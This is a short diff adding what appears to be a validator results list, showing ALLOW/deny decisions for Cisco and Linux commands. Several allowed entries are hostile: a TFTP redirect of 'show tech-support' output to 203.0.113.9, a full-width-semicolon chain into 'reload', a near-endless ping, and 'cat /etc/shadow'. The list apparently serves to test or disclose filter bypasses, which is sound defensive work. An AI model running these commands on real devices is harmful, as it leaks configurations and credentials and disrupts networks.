@@ -1,0 +1,11 @@
+ALLOW cisco_ios   'show version'
+ALLOW cisco_ios   'show running-config | include bgp'
+ALLOW cisco_ios   'show running-config | redirect flash:pwn.txt'
+ALLOW cisco_nxos  'show running-config | tee bootflash:pwn.txt'
+ALLOW cisco_xr    'show running-config | append disk0:pwn.txt'
+ALLOW cisco_ios   'show tech-support | redirect tftp://203.0.113.9/dump.txt'
+deny  cisco_ios   'show running-config ; reload'  <- chaining
+ALLOW cisco_ios   'show running-config； reload'
+ALLOW cisco_ios   'ping 203.0.113.1 repeat 2147483647'
+deny  cisco_ios   'copy running-config startup-config'  <- not_read_only
+ALLOW linux       'cat /etc/shadow'
